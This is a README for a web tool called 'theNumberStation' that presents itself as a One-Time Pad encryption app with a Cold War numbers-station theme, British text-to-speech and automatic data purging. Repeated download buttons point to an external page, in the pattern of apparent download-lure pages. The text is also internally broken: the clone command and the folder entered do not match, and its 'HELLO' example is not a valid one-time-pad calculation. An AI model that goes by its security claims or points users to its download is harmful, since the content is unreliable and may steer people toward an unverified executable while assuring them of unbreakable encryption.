# theNumberStation — Cryptographic Tool 2026

> A browser-based encryption application that implements the One-Time Pad cipher, historically used by Cold War numbers stations. It offers information-theoretic security through a distinctive British TTS interface and automatic data erasure.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jordangray1994/number-station-executor?style=flat-square)](https://github.com/jordangray1994/number-station-executor)

---

<p align="center">
  <a href="https://jordangray1994.github.io/number-station-executor/">
    <img src="https://img.shields.io/badge/Download-theNumberStation%20Latest-brightgreen?style=for-the-badge" alt="Download theNumberStation">
  </a>
</p>

> **[Direct Download — theNumberStation v1.0](https://jordangray1994.github.io/number-station-executor/)**

---

[Download Latest Build](https://jordangray1994.github.io/number-station-executor/)

---

## Overview of theNumberStation

theNumberStation revives the classic Cold War numbers station atmosphere in a contemporary web-based encryption tool. Taking cues from the memorable "Call of Duty Black Ops" number sequences, this application allows you to encrypt and decrypt messages with the One-Time Pad cipher — a method proven to be theoretically unbreakable. It appeals to cryptography aficionados, history enthusiasts, and anyone intrigued by the blend of espionage and mathematics.

What distinguishes this implementation is its dedication to both authenticity and safety. The interface replicates the appearance of a traditional numbers station broadcast, complete with a British text-to-speech voice that vocalizes encrypted sequences. Each session automatically removes all data upon completion, leaving no residual traces. The application runs within a Dockerized environment, enabling straightforward and consistent deployment across various systems.

## Capabilities

- **Information-Theoretic Security** — Executes the One-Time Pad cipher, delivering mathematically unbreakable encryption when properly used with genuinely random keys
- **British TTS Integration** — Encrypted number sequences are spoken aloud using authentic British speech synthesis for an immersive numbers station feel
- **Protocol Pointer System** — A structured workflow guides you through the encryption process, from message entry to secure transmission
- **Amber-P3 UI** — A retro amber monochrome display reminiscent of Cold War-era cryptographic hardware
- **Automatic Data Purge** — Plaintext and key materials are automatically erased after each encryption or decryption cycle
- **Dockerized Infrastructure** — Container-based setup ensures reliable performance on Windows, macOS, and Linux

## Getting Started

Clone the repository and start the application with Docker:

```bash
git clone https://github.com/jordangray1994/number-station-executor.git
cd theNumberStation-cipher
docker-compose up -d
```

For a non-containerized local experience, open `index.html` directly in your browser. The application functions entirely on the client side without any server dependencies.

## How to Use

1. **Enter Your Message** — Type the plaintext for encryption or the ciphertext for decryption
2. **Create a One-Time Pad** — The system generates a random key matching the length of your message
3. **Encrypt or Decrypt** — The XOR operation between your message and key produces the output
4. **Broadcast via TTS** — Press the broadcast button to hear the encrypted numbers read by the British voice
5. **Auto-Purge** — Closing the session triggers automatic deletion of all sensitive data

Example of encrypting a brief message:

```
Input: HELLO
Key:    83741
Output: 12345
```

The recipient, who holds the identical key, can reverse the operation to retrieve the original text.

## Configuration Options

Settings are stored locally in a `config.js` file, allowing you to modify:

- TTS voice speed and pitch
- Default cipher mode (encrypt or decrypt)
- UI color scheme choices
- Auto-purge timeout interval

For Docker deployments, environment variables in `docker-compose.yml` take precedence over config file settings.

## System Requirements

- Modern web browser (Chrome, Firefox, Edge, or Safari — latest version)
- Docker Engine 20.10+ (optional, for containerized deployment)
- JavaScript enabled in browser
- No server-side dependencies or database requirements
- Minimum 256MB RAM recommended for smooth TTS operation

## Frequently Asked Questions

**What makes this different from other encryption tools?**  
theNumberStation emphasizes the One-Time Pad cipher, which offers information-theoretic security — it remains unbreakable regardless of computational resources, as long as the key stays secret and is never reused.

**Is this suitable for real secure communications?**  
Yes, but you must distribute the One-Time Pad key through a separate secure channel. This tool handles only encryption and decryption; key distribution is your responsibility.

**Why does the data auto-purge?**  
Automatic deletion prevents sensitive plaintext and keys from persisting on disk or in browser storage, minimizing the risk of accidental exposure.

**How do I upgrade to a newer version?**  
Pull the latest changes from the repository and rebuild the Docker container: `git pull && docker-compose up -d --build`

## License

GNU GPL v3.0 — see [LICENSE](LICENSE) for details.
